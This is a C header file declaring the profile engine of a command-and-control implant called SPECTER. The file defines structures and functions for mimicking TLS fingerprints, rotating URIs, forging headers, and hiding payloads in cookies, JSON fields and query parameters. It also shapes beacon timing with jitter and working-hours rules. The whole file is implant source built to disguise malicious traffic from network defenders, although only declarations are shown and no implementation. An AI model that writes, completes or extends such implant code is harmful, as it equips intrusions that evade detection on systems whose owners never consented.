/**
 * SPECTER Implant — Malleable C2 Profile Engine Interface
 *
 * Parses TLV-encoded binary profile blobs compiled by the teamserver.
 * Drives HTTP request/response shaping: URI rotation, header construction,
 * payload embedding/extraction, and timing model parameters.
 */

#ifndef PROFILE_H
#define PROFILE_H

#include "specter.h"
#include "crypto.h"

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

#define PROFILE_MAX_URIS          16
#define PROFILE_MAX_URI_LEN       256
#define PROFILE_MAX_HEADERS       16
#define PROFILE_MAX_HEADER_LEN    512
#define PROFILE_MAX_BODY_TMPL     1024
#define PROFILE_MAX_NAME_LEN      64
#define PROFILE_MAX_EMBED_POINTS  4
#define PROFILE_MAX_BURST_WINDOWS 4

/* ------------------------------------------------------------------ */
/*  TLV field IDs (must match teamserver compiler.rs)                  */
/* ------------------------------------------------------------------ */

#define TLV_PROFILE_NAME          0x01

#define TLV_TLS_CIPHER_SUITES    0x10
#define TLV_TLS_EXTENSIONS       0x11
#define TLV_TLS_CURVES           0x12
#define TLV_TLS_ALPN             0x13
#define TLV_TLS_TARGET_JA3       0x14

#define TLV_HTTP_REQ_METHOD       0x20
#define TLV_HTTP_REQ_URI_PATTERN  0x21
#define TLV_HTTP_REQ_HEADER       0x22
#define TLV_HTTP_REQ_BODY_TMPL    0x23
#define TLV_HTTP_REQ_EMBED_POINT  0x24

#define TLV_HTTP_RESP_STATUS      0x30
#define TLV_HTTP_RESP_HEADER      0x31
#define TLV_HTTP_RESP_BODY_TMPL   0x32
#define TLV_HTTP_RESP_EMBED_POINT 0x33
#define TLV_HTTP_RESP_ERROR_RATE  0x34

#define TLV_HTTP_URI_ROTATION     0x35

#define TLV_TIMING_INTERVAL       0x40
#define TLV_TIMING_JITTER_DIST    0x41
#define TLV_TIMING_JITTER_PCT     0x42
#define TLV_TIMING_WORKING_HOURS  0x43
#define TLV_TIMING_BURST_WINDOW   0x44
#define TLV_TIMING_INITIAL_DELAY  0x45

#define TLV_TRANSFORM_COMPRESS    0x50
#define TLV_TRANSFORM_ENCRYPT     0x51
#define TLV_TRANSFORM_ENCODE      0x52

/* ------------------------------------------------------------------ */
/*  Enumerations                                                       */
/* ------------------------------------------------------------------ */

typedef enum _URI_ROTATION_MODE {
    URI_ROTATION_SEQUENTIAL = 0,
    URI_ROTATION_RANDOM     = 1,
    URI_ROTATION_ROUNDROBIN = 2,
} URI_ROTATION_MODE;

typedef enum _JITTER_DISTRIBUTION {
    JITTER_UNIFORM   = 0,
    JITTER_GAUSSIAN  = 1,
    JITTER_PARETO    = 2,
    JITTER_EMPIRICAL = 3,
} JITTER_DISTRIBUTION;

typedef enum _EMBED_LOCATION {
    EMBED_JSON_FIELD      = 0,
    EMBED_COOKIE_VALUE    = 1,
    EMBED_URI_SEGMENT     = 2,
    EMBED_QUERY_PARAM     = 3,
    EMBED_MULTIPART_FIELD = 4,
    EMBED_HEADER_VALUE    = 5,
} EMBED_LOCATION;

typedef enum _EMBED_ENCODING {
    EMBED_ENC_BASE64 = 0,
    EMBED_ENC_HEX    = 1,
    EMBED_ENC_RAW    = 2,
} EMBED_ENCODING;

typedef enum _COMPRESS_METHOD {
    COMPRESS_NONE = 0,
    COMPRESS_LZ4  = 1,
    COMPRESS_ZSTD = 2,
} COMPRESS_METHOD;

typedef enum _ENCODE_METHOD {
    ENCODE_BASE64          = 0,
    ENCODE_BASE85          = 1,
    ENCODE_HEX             = 2,
    ENCODE_RAW             = 3,
    ENCODE_CUSTOM_ALPHABET = 4,
} ENCODE_METHOD;

/* ------------------------------------------------------------------ */
/*  Profile sub-structures                                             */
/* ------------------------------------------------------------------ */

typedef struct _EMBED_POINT {
    DWORD  location;           /* EMBED_LOCATION enum                  */
    DWORD  encoding;           /* EMBED_ENCODING enum                  */
    char   field_name[64];     /* Field name (e.g., "data", "text")    */
} EMBED_POINT;

typedef struct _HTTP_TEMPLATE {
    char   method[8];          /* "GET" or "POST"                      */
    char   uri_patterns[PROFILE_MAX_URIS][PROFILE_MAX_URI_LEN];
    DWORD  uri_count;
    char   headers[PROFILE_MAX_HEADERS][PROFILE_MAX_HEADER_LEN];
    DWORD  header_count;
    char   body_template[PROFILE_MAX_BODY_TMPL];
    EMBED_POINT embed_points[PROFILE_MAX_EMBED_POINTS];
    DWORD  embed_count;
    WORD   status_code;        /* Response only                        */
    WORD   error_rate;         /* Response only (percent * 100)        */
} HTTP_TEMPLATE;

typedef struct _WORKING_HOURS {
    BYTE   start_hour;         /* 0-23                                 */
    BYTE   end_hour;           /* 0-23                                 */
    BYTE   day_mask;           /* Mon=0x01..Sun=0x40                   */
    WORD   off_hours_mult_100; /* Multiplier * 100 (400 = 4.0x)        */
} WORKING_HOURS;

typedef struct _BURST_WINDOW {
    BYTE   start_hour;
    BYTE   end_hour;
    QWORD  interval_override;  /* Seconds                              */
} BURST_WINDOW;

typedef struct _TIMING_CONFIG {
    QWORD  callback_interval;  /* Seconds                              */
    DWORD  jitter_distribution;/* JITTER_DISTRIBUTION enum             */
    WORD   jitter_pct_100;     /* Jitter percent * 100 (2500 = 25%)    */
    WORKING_HOURS working_hours;
    BOOL   has_working_hours;
    BURST_WINDOW burst_windows[PROFILE_MAX_BURST_WINDOWS];
    DWORD  burst_count;
    QWORD  initial_delay;      /* Seconds                              */
} TIMING_CONFIG;

typedef struct _TRANSFORM_CONFIG {
    DWORD  compress;           /* COMPRESS_METHOD enum                 */
    DWORD  encrypt;            /* Always 0 = ChaCha20-Poly1305        */
    DWORD  encode;             /* ENCODE_METHOD enum                   */
} TRANSFORM_CONFIG;

/* ------------------------------------------------------------------ */
/*  PROFILE_CONFIG — top-level parsed profile                          */
/* ------------------------------------------------------------------ */

typedef struct _PROFILE_CONFIG {
    char             name[PROFILE_MAX_NAME_LEN];
    HTTP_TEMPLATE    request;
    HTTP_TEMPLATE    response;
    DWORD            uri_rotation;    /* URI_ROTATION_MODE enum        */
    TIMING_CONFIG    timing;
    TRANSFORM_CONFIG transform;
    DWORD            uri_index;       /* Current URI rotation index    */
    BOOL             initialized;
} PROFILE_CONFIG;

/* ------------------------------------------------------------------ */
/*  API                                                                */
/* ------------------------------------------------------------------ */

/**
 * Parse a TLV binary profile blob into PROFILE_CONFIG.
 * blob: compiled profile from teamserver.
 * blob_len: size in bytes.
 * cfg_out: output structure (caller-allocated).
 * Returns STATUS_SUCCESS on success.
 */
NTSTATUS profile_init(const BYTE *blob, DWORD blob_len, PROFILE_CONFIG *cfg_out);

/**
 * Get the next URI based on the rotation mode.
 * Returns pointer to static URI string within cfg.
 */
const char *profile_get_uri(PROFILE_CONFIG *cfg);

/**
 * Build HTTP headers string from profile into output buffer.
 * Template variables like {{timestamp}} and {{random_hex(N)}} are expanded.
 * Returns number of bytes written (not counting NUL), or 0 on error.
 */
DWORD profile_build_headers(PROFILE_CONFIG *cfg, char *output, DWORD max_len);

/**
 * Embed payload data into the HTTP body template per the profile's
 * embed points. Data is encoded per embed point encoding config.
 * Returns bytes written to body_out, or 0 on error.
 */
DWORD profile_embed_data(PROFILE_CONFIG *cfg, const BYTE *data, DWORD data_len,
                          BYTE *body_out, DWORD max_len);

/**
 * Extract payload data from an HTTP response body using the response
 * profile's embed points. Decodes per embed encoding config.
 * Returns extracted data length, or 0 on error.
 */
DWORD profile_extract_data(PROFILE_CONFIG *cfg, const BYTE *body, DWORD body_len,
                            BYTE *data_out, DWORD *data_len_out);

/**
 * Get the HTTP method for requests (COMMS_HTTP_GET or COMMS_HTTP_POST).
 */
DWORD profile_get_method(PROFILE_CONFIG *cfg);

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
void profile_test_set_prng_seed(DWORD seed);
#endif

#endif /* PROFILE_H */
